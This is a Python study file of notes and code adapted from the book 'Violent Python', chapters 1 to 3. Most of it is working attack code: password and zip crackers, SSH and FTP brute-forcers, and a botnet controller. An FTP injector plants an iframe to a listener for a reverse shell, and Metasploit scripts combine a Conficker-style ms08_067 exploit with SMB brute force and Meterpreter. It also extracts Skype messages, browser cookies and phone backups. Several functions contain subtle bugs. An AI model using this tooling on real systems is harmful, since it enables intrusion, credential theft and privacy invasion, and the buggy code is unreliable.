#####################################################################
# Chapter 1
#####################################################################

import re
import os
import nmap
import json
import time
import dpkt
import crypt
import urllib
# import obexftp
import sqlite3
import pexpect
import zipfile
import smtplib
import optparse
# import cookielib - no longer cookielib in python3
import mechanize
import urllib.parse
from socket import *
# from winreg import * || This is a windows only module
from PIL import Image
import geoip2.database
from bluetooth import *
from threading import *
from scapy.all import *
from pexpect import pxssh
from IPy import IP as IPTEST
from bs4 import BeautifulSoup
from PIL.ExifTags import TAGS
from PyPDF2 import PdfFileReader
from urllib.parse import urlsplit
from email.mime.text import MIMEText


def banner_and_service_example():
    port = 21
    banner = "FreeFloat FTP Server"
    print("[+] Checking for "+banner+" on port " + str(port))

    # Don't forget about the list.index function

    # Reserved names for some ports
    services = {
        'ftp': 21, 'ssh': 22, 'smtp': 25,
        'http': 80
    }


def socket_example(ip, port):
    # This piece of code will time out, but you get the idea

    try:
        socket.setdefaulttimeout(2)
        s = socket.socket()
        s.connect((ip, port))
        banner = s.recv(1024)
        return banner

    except Exception as e:
        print("Error = " + str(e))


def check_vuls(banner):
    with open("vul_banners.txt", "r") as f:
        for line in f.readlines():
            if line.strip("\n") in banner:
                print("Server is vulnerable: " + banner.strip("\n"))


def socket_checker():
    port_list = [21, 22, 25, 80, 110, 443]
    for x in range(1, 255):
        ip = '192.168.95.' + str(x)

        for port in port_list:
            banner = socket_example(ip, port)
            if banner:
                check_vuls(banner)

# We can use a for loop to iterate through an entire subnet of
# IP addresses for 192.168.95.1 through 192.168.95.254.
# Now let's rewrite the socket_example to check all 254 IP addresses
# with ports for telnet, SSH, smtp, http, imap, and https services.

# Useful os module functions: os.path.isfile, os.access, etc...
# print(crypt.crypt("egg", "HX"))

# We will now write a program which reads from a passwords.txt file
# and outputs the encrypted pasword, and it checks the encryption against
# the dictionary file.


def test_pass(crypted_pass):
    # removing the salt from encrypted (first two letters)
    salt = crypted_pass[0:2]
    with open("dictionary.txt", "r") as file:
        for word in file.readlines():
            word = word.strip("\n")
            crypt_word = crypt.crypt(word, salt)

            if crypt_word == crypted_pass:
                print("Found the password")
                return

    print("Password not found.")
    return


def main_func():
    with open("passwords.txt") as f:
        for line in f.readlines():
            if ":" in line:
                crypt_pass = line.split(':')[1].strip(" ")
                test_pass(crypt_pass)

# On *Nix based OS's, the /etc/shadow file stores hashed passwords.
# Challenge: update the script to crack SHA-512 hashes


def test_sha(cryptPass):
    salt = cryptPass[0:11]
    print("[+] Salt: " + salt)
    dictFile = open('dictionary.txt', 'r')
    for word in dictFile.readlines():
        word = word.strip('\n')
        cryptword = crypt.crypt(word, salt)
        print("[+] Hash value: " + cryptword)
        if (cryptword == cryptPass):
            print("[+] Found password: "+word+"\n")
            return
    print("[-] Password not found.\n")
    return


def main_sha():
    passfile = open('passwords.txt')
    for line in passfile.readlines():
        if ":" in line:
            user = line.split(':')[0]
            cryptPass = line.split(':')[1].strip(' ')
            print("[*] Cracking password for: "+user)
            test_sha(cryptPass)

# Now we will write a zip file password cracker.


def extract_file(zip_file, password):
    try:
        zip_file.extractall(pwd=password.encode('utf-8'))
        print("password is {}".format(password))
    except Exception as e:
        pass


def main_zip():
    parser = optparse.OptionParser("usage%prog " +
                                   "-f <zipfile> -d <dictionary>")
    parser.add_option('-f', dest='zname', type='string',
                      help='specify zip file')
    parser.add_option('-d', dest='dname', type='string',
                      help='specify dictionary file')
    options, args = parser.parse_args()

    if (options.zname == None) | (options.dname == None):
        print(parser.usage)
        exit(0)
    else:
        zname = options.zname
        dname = options.dname

    zip_file = zipfile.ZipFile(zname)
    pass_file = open(dname)

    for line in pass_file.readlines():
        password = line.strip("\n")
        t = Thread(target=extract_file, args=(zip_file, password))
        t.start()

    pass_file.close()

#####################################################################
# Chapter 2
#####################################################################

# Check the system and its vulnerabilities before choosing exploits.
# Now, we'll scan target hosts for open TCP ports. Most applications
# use TCP (TCP: 80, email: 25, FTP: 21, ...). To connect to any of
# these we need the IP address and the service port. We need to
# port scan! We can send TCP SYN packet and wait for responses,
# signalling an open port (is this called a ping?). Another form
# of this is a full 3-way handshake. We will choose to write the latter.


def handshake():
    parser = optparse.OptionParser(
        'usage %prog –H' + '<target host> -p <target port>')

    parser.add_option('-H', dest='tgtHost', type='string',
                      help='specify target host')
    parser.add_option('-p', dest='tgtPort', type='string',
                      help='specify target port(s), seperated by commas')

    options, _ = parser.parse_args()
    tgtHost = options.tgtHost
    tgtPorts = str(options.tgtPort).split(', ')

    if (tgtHost == None) | (tgtPorts[0] == None):
        print(parser.usage)
        return

    port_scan(tgtHost, tgtPorts)


screenLock = Semaphore(value=1)


def conn_scan(host, port):
    try:
        conn_sock = socket(AF_INET, SOCK_STREAM)
        conn_sock.connect((host, port))

        # After connection, we know that a port is open, so we can send some data
        # and wait for a response
        conn_sock.send(b'Violent Python')
        results = conn_sock.recv(100)

        screenLock.acquire()
        print("tcp open in port {}".format(port))
        print("Got some results AKA " + str(results))

    except Exception as e:
        screenLock.acquire()
        print(e)

    finally:
        screenLock.release()
        conn_sock.close()


def port_scan(host, ports):
    try:
        target_ip = gethostbyname(host)
    except:
        print("Cannot resolve unknown host")
        return

    try:
        target_name = gethostbyaddr(target_ip)
        print('\n[+] Scan Results for: ' + target_name[0])
    except:
        print('\n[+] Scan Results for: ' + target_ip)

    setdefaulttimeout(1)
    for port in ports:
        t = Thread(target=conn_scan, args=(host, int(port)))
        t.start()

# The scanning of sockets should be done in a threaded manner, which is super simple
# using the threading module as you've done before. However, there's a disadvantage:
#         t = Thread(target=conn_scan, args=(host, int(port)))
#         t.start()
# Simply doing this will jumble up execution order. Imagine if you're outputting
# something to the terminal - disaster!!
# Use semaphores to rescue you from this situation.

# Although the above example was fun to work though, it is limited in the sense that
# it only uses handshake scanning, while you may very well want to use others as well.
# Enter, nmap-python.


def nmap_scan(host, port):
    nm = nmap.PortScanner()
    nm.scan(host, port)
    state = nm[host]['tcp'][int(port)]['state']
    return state

# Let's try to create our own SSH worm. We will use the Pexpect moduel, which can be
# used to monitor and interact with programs, making it a good choice to work with
# SSH consoles.


PROMPT = ['#', '>>>', '>', '\$']
max_connections = 5
connection_lock = BoundedSemaphore(value=max_connections)
found = False
fails = 0


def send_command(child, cmd):
    child.sendline(cmd)
    child.expect(PROMPT)
    print(child.before)


def connect(user, host, password, release):
    # If you wanna use a global variable in a functional scope instead of creating a local
    # copy of the same, use the global keyword. Pylance linting will also show you if
    # you're not using any particular variable nicely (if you're only updating the variable
    # in the function).

    global found
    global fails

    try:
        s = pexpect.pxssh()
        s.login(host, user, password)
        print("Password found!")
        found = True

    # How to handle multiple exceptions!
    except Exception as e:
        if 'read_nonblocking' in str(e):
            fails += 1
            time.sleep(5)

            # Recursively call again after sleeping for 5 seconds
            connect(user, host, password, False)

        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(user, host, password, False)

        else:
            print(str(e))

    finally:
        if release:
            connection_lock.release()


# Python pro tip: if you wanna break up function calls
# or long print statements up, use one of '\' these
# bad boys and move along.
def ssh_main():
    parser = optparse.OptionParser('usage%prog ' +
                                   '-H <target host> -u <user> -F <password list>')

    parser.add_option('-H', dest='tgtHost', type='string', help='target host')
    parser.add_option('-u', dest='tgtUser', type='string', help='target user')
    parser.add_option('-F', dest='passwordFile',
                      type='string', help='password file')

    options, _ = parser.parse_args()
    tgtHost, tgtUser, passwordFile = options.tgtHost, options.tgtUser, options.passwordFile

    if tgtHost == None or tgtUser == None or passwordFile == None:
        print(parser.usage)
        return

    with open(passwordFile, 'r') as pass_file:
        for line in pass_file.readlines():
            if found:
                return
            if fails > 5:
                print("Too many timeouts!")
                return

            connection_lock.acquire()
            password = line.strip("\n").strip("\r")
            print("Testing password " + password)
            t = Thread(target=connect, args=(tgtHost, tgtUser,
                                             password, True))
            _ = t.start()


# SSH can also be done with public key cryptography, which is more complex than the
# simple UNIX passwords seen earlier. Let's try to create a SSH key breaker.

stop = False


def connect_key(user, host, keyfile, release):
    global fails
    global stop

    try:
        perm_denied = "permission denied"
        ssh_newkey = 'Are you sure you want to continue'
        conn_closed = 'Connection closed by remote host'
        opt = '-o PasswordAuthentication=no'
        connection_string = f"ssh {user}@{host} –i {keyfile} {opt}"
        child = pexpect.spawn(connection_string)

        ret = child.expect([pexpect.TIMEOUT, perm_denied,
                            ssh_newkey, conn_closed, '$', '#', ])

        if ret == 2:
            print('[-] Adding Host to ∼/.ssh/known_hosts')
            child.sendline('yes')
            connect(user, host, keyfile, False)

        elif ret == 3:
            print('[-] Connection Closed By Remote Host')
            fails += 1

        elif ret > 3:
            print("[+] Success " + str(keyfile))
            stop = True

    finally:
        if release:
            connection_lock.release()


def key_main():
    parser = optparse.OptionParser('usage%prog -H ' +
                                   '<target host> -u <user> -d <directory>')
    parser.add_option('-H', dest='tgtHost', type='string',
                      help='specify target host')
    parser.add_option('-d', dest='passDir', type='string',
                      help='specify directory with keys')
    parser.add_option('-u', dest='user', type='string',
                      help='specify the user')
    options, _ = parser.parse_args()
    host = options.tgtHost
    passDir = options.passDir
    user = options.user

    if host == None or passDir == None or user == None:
        print(parser.usage)
        return

    for filename in os.listdir(passDir):
        if stop:
            print("Key found!")
            return

        if fails > 5:
            print("Too many closed connections!")
            return

        connection_lock.acquire()
        fullpath = os.path.join(filename, passDir)
        print("Testing keyfile: " + str(fullpath))
        t = Thread(target=connect_key, args=(user, host, fullpath, True))
        _ = t.start()


# This is one remote host (or a computer) we just broke into. Malicious attackers
# often use pools of such broken computers, also called a botnet for, well,
# malicious purposes.

class Client:
    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.connect()

    def connect(self):
        try:
            s = pxssh.pxssh()
            s.login(self.host, self.user, self.password)
            return s
        except Exception as e:
            print(str(e))

    def send_command(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before


def add_client(host, user, password):
    bot_net.append(Client(host, user, password))


def botnet_command(command):
    for client in bot_net:
        output = client.send_command(command)
        print("Output from {}".format(client.host))
        print("Output: {}".format(output))


bot_net = []
# add_client('10.10.10.110', 'root', 'toor')
# add_client('10.10.10.120', 'root', 'toor')
# add_client('10.10.10.130', 'root', 'toor')
# botnet_command('uname -v')
# botnet_command('cat /etc/issue')

# This script is attacking servers directly, but there are other ways to go about it as well.
# For example, let's study the k985ytv attack, which a botnet to inject JavaScript and
# redirect people who visit a site to download anti-virus software which stole credit card
# information. How can you do this using python?

# Before we go forward, let's talk more about FTP (file transfer protocol). You can use
# the ftplib module to determine if any service offers anonymous FTP.


def anonymous_login(hostname):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login('anonymous', 'random@random.com')
        print("Sucess with host: " + str(hostname))
        ftp.quit()
        return True
    except Exception as e:
        print("Unsuccessful with host: " + str(hostname))
        return False


# host = '192.168.95.179'
# anonymous_login(host)

# If you really wanna get in, and the host doesn't enable anonymous login, you can
# brute force credentials, which attackers have been quite successful with in the
# past.


def brute_login(hostname, password_file):
    file = open(password_file, 'r')
    for line in file.readlines():
        username = line.split(":")[0]
        password = line.split(":")[1].strip('r').strip('\n')
        print("Trying {}:{}".format(username, password))

        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(username, password)
            print("[+] Login succeeded!")
            ftp.quit()
            return (username, password)

        except:
            pass

    print("Couldn't find a username:password combination")
    return (None, None)


host = '192.168.95.179'
passwdFile = 'ftp_pass.txt'

# Once we have valid FTP credentials, it is good to know if server provides web service
# (for the JS injection). On a server, the NLST command spits out a list of files, which
# we can take advantage of.


def check_ftp_webpages(ftp):
    try:
        dirlist = ftp.nlst()
    except:
        print("Couldn't find any directories :(")
        return

    pages = []
    for file in dirlist:
        fn = file.lower()

        if '.php' in fn or '.html' in fn or '.asp' in fn:
            pages.append(file)

    return pages

# Now that we have the pages, we can start injecting our own client side code to it!
# Create a malicious server and page (MetaSploit is a good framework). Victims who
# visit this page will be redirected and we'll receive a callback, through which we
# can inject our JS. If connected, there'll be a reverse TCP shell created, and through
# this shell, we'll execute commands as the administrator of the infected client.
# The next step is simple: download the file, add whatever you want, and reupload the file.


def fpt_injector(ftp, page, redirect):
    file = open(page + '.tmp', 'w')
    ftp.retrlines('RETR ' + page, file.write)
    file.write(redirect)
    file.close()
    ftp.storlines('STOR ' + page, open(page + '.tmp'))

# After the login and checking functions used earlier, call the injector by
# redirect = '<iframe src='+\
#   '"http://10.10.10.112:8080/exploit"></iframe>'
# fpt_injector(ftp, 'index.html', redirect)
#
# which just redirects the main page to our malicious server, through which we gain
# administrative access to that victim.


def attack(username, password, tgtHost, redirect):
    ftp = ftplib.FTP(tgtHost)
    ftp.login(username, password)
    defPages = check_ftp_webpages(ftp)
    for defPage in defPages:
        fpt_injector(ftp, defPage, redirect)

# The k985ytv was just all this code (with the addition of trying anonymous access first, and
# if that fails, try the brute force version). In under 100 lines of python code, this
# interesting attack can be set up. Incredible.

# The next attack discuss in the book compromised over 5 million workstations in 200 countries!
# A simple python script which repeats the process of scanning for an open port and creating a
# Metasploit config file to attack the host.

# Searches for all hosts within a subnet


def find_targets(subnet):
    nm_scan = nmap.PortScanner()
    nm_scan.scan(subnet, '445')
    target_hosts = []

    for host in nm_scan.all_hosts():
        if nm_scan[host].has_tcp(445):
            state = nm_scan[host]['tcp'][445]['state']

            if state == 'open':
                print("[+] Found target host")
                target_hosts.append(host)

    return target_hosts


# We can use MetaSploit's Meterpreter to analyze the infected target.
# We have to setup a listener function, which will do the following:

def setup_handler(config_file, lhost, lport):
    config_file.write('use exploit/multi/handler\n')
    config_file.write('set PAYLOAD ' +
                      'windows/meterpreter/reverse_tcp\n')
    config_file.write('set LPORT ' + str(lport) + '\n')
    config_file.write('set LHOST ' + lhost + '\n')
    config_file.write('exploit -j -z\n')
    config_file.write('setg DisablePayloadHandler 1\n')


def confickerExploit(configFile, tgtHost, lhost, lport):
    configFile.write('use exploit/windows/smb/ms08_067_netapi\n')
    configFile.write('set RHOST ' + str(tgtHost) + '\n')
    configFile.write('set payload ' +
                     'windows/meterpreter/reverse_tcp\n')
    configFile.write('set LPORT ' + str(lport) + '\n')
    configFile.write('set LHOST ' + lhost + '\n')
    configFile.write('exploit -j -z\n')

# Although this exploit has been successful in the past, we have created
# security patches which will handle this easily. This is why the
# conflicker worm used another attack vector in conjunction.
# 1. Brute force SMB username/passwords
# 2. Get access to remotely executed processes (psexec)
# 3. If success, launch Meterpreter back to the local address and port


def smb_brute(config_file, target_host, password_file, lhost, lport):
    username = 'Administrator'
    pf = open(password_file, 'r')

    for password in pf.readlines():
        password = password.strip('\n').strip('\r')
        config_file.write('use exploit/windows/smb/psexec\n')
        config_file.write('set SMBUser ' + str(username) + '\n')
        config_file.write('set SMBPass ' + str(password) + '\n')
        config_file.write('set RHOST ' + str(target_host) + '\n')
        config_file.write('set PAYLOAD ' +
                          'windows/meterpreter/reverse_tcp\n')
        config_file.write('set LPORT ' + str(lport) + '\n')
        config_file.write('set LHOST ' + lhost + '\n')
        config_file.write('exploit -j -z\n')


def conflicker_main():
    config = open('meta.rc', 'w')
    parser = optparse.OptionParser('[-] Usage%prog ' +
                                   '-H <RHOST[s]> -l <LHOST> [-p <LPORT> -F <Password File>]')
    parser.add_option('-H', dest='tgtHost', type='string',
                      help='specify the target address[es]')
    parser.add_option('-p', dest='lport', type='string',
                      help='specify the listen port')
    parser.add_option('-l', dest='lhost', type='string',
                      help='specify the listen address')
    parser.add_option('-F', dest='passwdFile', type='string',
                      help='password file for SMB brute force attempt')
    (options, _) = parser.parse_args()

    if (options.tgtHost == None) | (options.lhost == None):
        print(parser.usage)
        exit(0)

    lhost = options.lhost
    lport = options.lport
    if lport == None:
        lport = '1337'

    password_file = options.passwdFile
    tgtHosts = find_targets(options.tgtHost)
    setup_handler(config, lhost, lport)
    for tgtHost in tgtHosts:
        confickerExploit(config, tgtHost, lhost, lport)

        if password_file != None:
            smb_brute(config, tgtHost, password_file, lhost, lport)

    config.close()
    os.system('msfconsole -r meta.rc')

# Buffer overflow attacks

# These work by overwriting the next pointers of user input fields. Some essential aspects of a stack based
# buffer overflow attack:
# 1. Overflow: input which exceeds he expected value in the stack
# 2. Return address: 4 byte address used to jump directly on top of the stack
# 3. Padding: A series of NOP (no operation) instructions, which allows the attacker to guesstimate the
#    next address to jump on.
# 4. Shellcode: a piece of code written in Assembly, which can be generated from MetaSpoit

# The idea is to connect to a port using sockets, authenticate to the host, and then send in the crash
# variable.


def buffer_attack(target, command, crash):
    """ Above all this code exists some other code (including the padding, return, overflow, etc), which
    hasn't been included here. Check out the book for more precise details. """

    s = socket(AF_INET, SOCK_STREAM)
    try:
        s.connect((target, 21))
    except:
        exit(0)

    s.send("USER anonymous\r\n")
    s.recv(1024)
    s.send("PASS \r\n")
    s.recv(1024)
    s.send(command + " " + crash + "\r\n")
    time.sleep(4)

#####################################################################
# Chapter 3
#####################################################################

# Windows OS stores certain metadata regarding wireless networks, which
# can be acquired through something called the windows registry. This registry
# stores the MAC address (a unique identifier given to a network adapter) in
# a REG_BINARY value.


def reg_to_mac(reg):
    addr = ""

    for character in reg:
        addr += ("%02x " % ord(character))

    addr = addr.strip(" ").replace(" ", ":")[:17]
    return addr

# We can write a function to extract network name and MAC address for every listed
# network profile from specific keys in the windows registry.


def print_nets():
    # I'm assuming this is the directory in which the registry is held
    net = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion" +\
        "\\NetworkList\\Signatures\\Unmanaged"

    key = OpenKey(HKEY_LOCAL_MACHINE, net)
    for i in range(100):
        try:
            guid = EnumKey(key, i)
            net_key = OpenKey(key, str(guid))
            _, addr, _ = EnumValue(net_key, 5)
            _, name, _ = EnumValue(net_key, 4)
            mac_addr = reg_to_mac(addr)
            net_name = str(name)
            print("[+] {} {}"/format(net_name, mac_addr))

        except:
            break

# Using MAC addresses of a wireless acess point, we can pinpoint the physical location
# as well. This can be done via the use of databases which map MAC addresses to the above
# stated locations. The code below uses the mechanize library which is for stateful web
# programming in python and the wigle API endpoints.

# The wigle_print function is pretty easy to understand. All it's doing is sending API
# requests to the wigle service with a valid username and password combination. Once
# we're authenticated, we'll be able to send requests to the query endpoint and pass
# it a MAC address, and extract its latitude and longitude using regexes. Combining
# it with the print_nets function (which spits out the MAC addresses of every
# network profile saved in the computer), we'll have the latitudes and longitudes
# of profile.


def wigle_print(username, password, netid):
    browser = mechanize.Browser()
    browser.open("http://wigle.net")
    req_data = urllib.parse.urlencode({
        'credential_0': username,
        'credential_1': password
    })

    browser.open('https://wigle.net/gps/gps/main/login', req_data)
    params = {}
    params['netid'] = netid
    req_params = urllib.parse.urlencode(params)
    resp_URL = 'http://wigle.net/gps/gps/main/confirmquery/'
    resp = browser.open(resp_URL, req_params).read()
    map_lat, map_long = 'N/A', 'N/A'

    r_lat = re.findall(r'maplat=.*&', resp)
    r_long = re.findall(r'maplon=.*&', resp)

    if r_lat:
        map_lat = r_lat[0].split('&')[0].split('=')[1]

    if r_long:
        map_long = r_long[0].split

    print("[+] Lat: {}, Long: {}".format(map_lat, map_long))

# Here's something interesting: files you deleted aren't really gone, but can actually be
# recovered, and we'll learn how to use the python OS module to do that here. (Even if
# the files were emptied out from the trash, it can still be recovered, but that isn't
# what we're going for right now).


# Trying to make this function OS independent because each OS has its own way
# of storing deleted files
def return_dir():
    dirs = ['C:\\Recycler\\', 'C:\\Recycled\\', 'C:\\$Recycle.Bin\\']
    for dir in dirs:
        if os.path.isdir(dirs):
            return dir

    return None

# In the example the author has given (most likely based on Windows), the Trash
# folder has subdirectories where the user ID is stored, which is what we need.
# Turns out, the Windows registry holds this information and we can actually
# translate the ID to a username.


def sid2user(sid):
    try:
        key = OpenKey((HKEY_LOCAL_MACHINE,
                       "SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList"
                       + '\\' + sid))

        value, _ = QueryValueEx(key, 'ProfileImagePath')
        user = value.split('\\')[-1]
        return user

    except:
        return sid


def find_recyled():
    recyle_dir = return_dir()
    dirs = os.listdir(recyle_dir)

    # There are subdirectories within the trash folder
    for dir in dirs:
        files = os.listdir(dir)
        username = sid2user(dir)
        print("[*] Listing files for user:{}".format(username))

        for file in files:
            print("[+] Found file: {}".format(str(file)))

# Now, this gets really interesting. You can actually check the contents and metadata of these files
# to find interesting information, using techniques which the forensic investigator in the book used
# to catch the criminal. Metadata can store useful information like the author's name, file creation
# or modification time, etc. Pro tip: photos may store GPS location. PyPDF, the tool you've used
# before, can also be used to check out metadata for pdf documents.


def print_meta(filename):
    pdf = PdfFileReader(open(filename, 'rb'))
    doc = pdf.getDocumentInfo()
    print("[*] Metadata for document: " + str(filename))
    for metadata in doc:
        print(doc[metadata])

# There's a thing called exif (exchange image file format) which defines how to store images
# and videos. Digital cameras, smartphones, etc use this while saving media. We can use the
# exiftool, written by some dope person, which can analyze the exif tags in photos/videos.
# For example, think of the photos app on Mac OS. There's a section of the app in which we
# can arrange photos in terms of the geographic region. Think about HOW the app is doing that.
# The answer is obvious: the only way that can be done is that the latitude and longitude of
# where the photo was taken must be encoded somewhere in the photo, which is then used to display
# it in a map. Let's write a script which downloads photos from a site and checks its exif tags.


def find_images(url):
    print("[+] Finding images on url: {}".format(url))
    url_content = urllib.request.urlopen(url).read()
    soup = BeautifulSoup(url_content, 'html.parser')
    images = soup.find_all('img')
    return images


def download_image(image):
    try:
        print("[+] Download image")
        image_src = image['src']
        image_content = urllib.request.urlopen(image_src).read()

        # Doing this probably extracts the image name exactly from the src
        image_file_name = os.path.basename(urlsplit(image_src)[2])

        with open(image_file_name, 'wb') as file:
            file.write(image_content)

        return image_file_name
    except:
        return ''

# The python library PIL can be used to process images in python. It actually has a
# function (called getexif) which retrieves the very thing we're talking about.
# We check the exif for GPS info and print it out.


def test_for_exif(image_file_name):
    try:
        exif_data = {}
        img_data = Image.open(image_file_name)
        info = img_data.getexif()

        if info:
            for tag, value in info.items():
                decoded = TAGS.get(tag, tag)
                exif_data[decoded] = value

            exifGPS = exif_data['GPSInfo']
            if exifGPS:
                print("[+] File {} contains GPS metadata".format(image_file_name))
                print(exif_data)
            else:
                print("[-] No GPS metadata in file")
        else:
            print("[-] No exif tags outputted by function")

    except Exception as e:
        print("[-] Something went wrong: " + str(e))


def img_exif_main(url):
    images = find_images(url)
    for image in images:
        file = download_image(image)
        test_for_exif(file)

# Databases are one of the most popular ways of storing data, and out of all types of databases,
# the name SQLite should ring a heavy bell because of its easy of use. Also, instead of a database
# server, SQLite operates on a single file (which is saved on the project directory), making it
# a good target for, ahem, hacking stuff.

# Skype also uses SQLite and the database file is stored in different directories in different OS's
# as usual (for MAC, it is cd /Users/<User>/Library/Application\ Support/Skype/<Skypeaccount>). We
# can connect to these databases and check out what the application stores in it; spoiler alert -
# it contains goodies like contacts, accounts, messages, etc (basically anything that is in the app
# itself).


def print_profile(skype_db):
    conn = sqlite3.connect(skype_db)
    c = conn.cursor()
    c.execute(
        "SELECT fullname, skypename, city, country, datetime(profile_timestamp,'unixepoch') FROM Accounts;")

    for row in c:
        print("[*] Found profile")
        print('[+] User: '+str(row[0]))
        print('[+] Skype Username: '+str(row[1]))
        print('[+] Location: '+str(row[2])+','+str(row[3]))
        print('[+] Profile Date: '+str(row[4]))

# Pass the above function "main.db" along with its absolute path, for whatever OS you're on.
# Using a similar idea from above, we'll extract some data from the contacts table.


def print_contacts(skyp_db):
    conn = sqlite3.connect(skyp_db)
    c = conn.cursor()
    c.execute(
        "SELECT  displayname, skypename, city, country, phone_mobile, birthday FROM Contacts;")

    for row in c:
        print("[*] Found contacts")
        print('[+] User : ' + str(row[0]))
        print('[+] Skype Username : ' + str(row[1]))
        if str(row[2]) != '' and str(row[2]) != 'None':
            print('[+] Location : ' + str(row[2]) + ',' + str(row[3]))
        if str(row[4]) != 'None':
            print('[+] Mobile Number : ' + str(row[4]))
        if str(row[5]) != 'None':
            print('[+] Birthday : ' + str(row[5]))

# So we extracted specific columns from specific tables. What if we wanted to output
# some info of multiple tables together? This calls for the infamous join. For example -
# to output a call, we need info from the Calls and Conversation tables.


def print_call_log(skype_db):
    conn = sqlite3.connect(skype_db)
    c = conn.cursor()

    # Select the call timestamp and identity from table Calls and Conversations where
    # both ids are equal
    c.execute(
        "SELECT datetime(begin_timestamp,'unixepoch'), \
        identity FROM calls, conversations WHERE \
        calls.conv_dbid = conversations.id;"
    )

    for row in c:
        print("[+] Call time: {} | Identity: {}".format(str(row[0]), str(row[1])))

# The skype database also stores all messages received and sent by the user profile.
# Very secure! ;) ;)


def print_mesages(skype_db):
    conn = sqlite3.connect(skype_db)
    c = conn.cursor()
    c.execute("SELECT datetime(timestamp,'unixepoch'), \
    dialog_partner, author, body_xml FROM Messages;")

    for row in c:
        try:
            if 'partlist' not in str(row[3]):

                # If dialog_partner != author
                if str(row[1]) != str(row[2]):
                    msg_direction = "To " + str(row[1]) + ": "

                else:
                    msg_direction = "To " + str(row[2]) + ": "

                print("Time: {} {} {}".format(
                    str(row[0]), msg_direction, str(row[3])))
        except:
            pass

# Browsers also store certain information in databases. For instance, firefox stores certain
# things in SQLite as well (In MAC OX, it is
# /Users/<USER>/Library/Application\ Support/Firefox/Profiles/<profile folder>). One more
# pro tip: learn linux cmd seriously. For example - as you were reading this section, you
# were thinking, "I wonder how people find these files. On the web? Oh gee, I'm gonna have
# to look for these things one folder at a time?!". But there are easier ways, if you know
# you command line homie. You could just go to the firefox main directory and search for
# files using regexes i.e. ls *.sqlite i.e. show all files ending with a .sqlite extension!


def print_firefox_downloads(db):
    conn = sqlite3.connect(db)
    c = conn.cursor()

    # For some reason, firefox developers decided to multiply the UNIX epoch time by 1000000
    # before saving it in the DB, so we divide it to get the actual epoch time.
    c.execute('SELECT name, source, datetime(endTime/1000000,\
    \'unixepoch\') FROM moz_downloads;')

    for row in c:
        print(
            "File {} downloaded from source {} @ {}".format(str(row[0]), str(row[1]), str(row[2])))

# What if you want to log into sites that use authentication? Here's how. Most websites that use
# authentication use cookies. When logged in successfully, the login page sets a cookie and redirects
# the page to another section. After that, no matter how many times you refresh the page, the session
# seems to persist. How? Cookies (or tokens of some other kind). In fact, even Instagram does this;
# this is unavoidable for user experience reasons (you'd have to login every time you visit another
# person's profile or search for something). If you're trying to break into a website, why not break
# into the source of what you're using to view the website in the first place?


def extract_cookies(db):
    try:
        conn = sqlite3.connect(db)
        c = conn.cursor()
        c.execute('SELECT host, name, value FROM moz_cookies')

        for row in c:
            # Double the {{}}'s if you want to print a literal curly brace in format string
            print("Host: {}, Cookie: {{{}:{}}}, ".format(
                str(row[0]), str(row[1]), str(row[2])))

    except Exception as e:
        # Doing this because in older versions of sqlite3, there may be an "encryption"
        # error which arises
        if 'encrypted' in str(e):
            print('[*] Error reading your cookies database.')
            print('[*] Upgrade your Python-Sqlite3 Library')


def print_history(db):
    try:
        conn = sqlite3.connect(db)
        c = conn.cursor()
        c.execute("select url, datetime(visit_date/1000000, \
        'unixepoch') from moz_places, moz_historyvisits \
        where visit_count > 0 and moz_places.id==\
        moz_historyvisits.place_id;")

        for row in c:
            url = str(row[0])
            if 'google' in url.lower():
                r = re.findall(r'q=.*\&', url)
                if r:
                    search = r[0].split('&')[0]
                    search = search.replace('q=', '').replace('+', ' ')
                    print(
                        "[+] Google search for {} on {}".format(search, str(row[1])))

    except Exception as e:
        if 'encrypted' in str(e):
            print('[*] Error reading your cookies database.')
            print('[*] Upgrade your Python-Sqlite3 Library')

# Using regular expressions, you can search for specific things inside a browser history,
# which may reveal pretty compromising things. Let's expand upon the previous function
# to search for google in the visited URLs.

# A very important point --
# The coming function in the book composes all the previous
# functions we've written. In doing so, we will generate the full path of the SQLite database
# file. We could just hardcode the path string (Users/Files/Location/file.sqlite), but this
# will make it platform dependent: using os.path.join and other os module functions lets us
# write os-independent scripts, which is what we're gunning for.

# Investigating itunes mobile backups? In April 2011, it was revealed that Apple devices
# saved GPS coordinates of the device's movements in a database file, which might obviously
# be used for bad purposes. This is not just limited to locations. Text messages are
# susceptible to the same vulnerability, which is at its worst during phone backups.
# Phone backups are stored in a special directory on the computer
# (MAC OS: /Users/<USERNAME>/Library/Application Support/MobileSync/Backup/). The
# directory contains a bunch of files with garbage names. To get more info out of the
# files, we can use the UNIX command "file", through which we can discover the database
# files. The problem now is that we don't know the structure of these databases, which
# we need before we can do anything with it like in the previous section.

# We will write a function which attempts to connect to each of these files and spit
# out tables for sqlite_master (exists in each SQLite db).


def print_tables(db):
    try:
        conn = sqlite3.connect(db)
        c = conn.cursor()

        # Printing all tables from the master table
        c.execute('SELECT tbl_name FROM sqlite_master \
        WHERE type==\"table\";')
        print("[*] Connected to database")

        for row in c:
            print("[+] Table {}".format(str(row)))
    except:
        pass

    finally:
        conn.close()


def open_dir():
    dir = os.listdir(os.getcwd())
    # For each file in the backup directory, try to connect to it
    # It'll only do so if it is sqlite file, otherwise it will raise an exception
    for file in dir:
        print_tables(file)

# One of the files will have a messages db. Remember that rhere will be different backup folders,
# so we want to write a function which will only return the messages db. The current version will
# enumerate all tables on all files.


def is_message_table(db):
    try:
        conn = sqlite3.connect(db)
        c = conn.cursor()

        # Printing all tables from the master table
        c.execute('SELECT tbl_name FROM sqlite_master \
        WHERE type==\"table\";')

        for row in c:
            if 'messages' in str(row):
                return True
    except:
        return False


def print_messages(db):
    try:
        conn = sqlite3.connect(db)
        c = conn.cursor()
        c.execute('select datetime(date,\'unixepoch\'),\
        address, text from message WHERE address>0;')

        for row in c:
            print("Date: {}, Address: {}, and Message: {}".format(
                str(row[0]), str(row[1]), str(row[2])))
    except:
        pass

# backup_path is the directory in which the backup folders are


def messages_main(backup_path):
    dirs = os.listdir(backup_path)
    for file in dirs:
        fullpath = os.path.join(backup_path, file)

        if is_message_table(fullpath):
            try:
                print("[*] Found some spicy messages")
                print_mesages(fullpath)
            except:
                pass


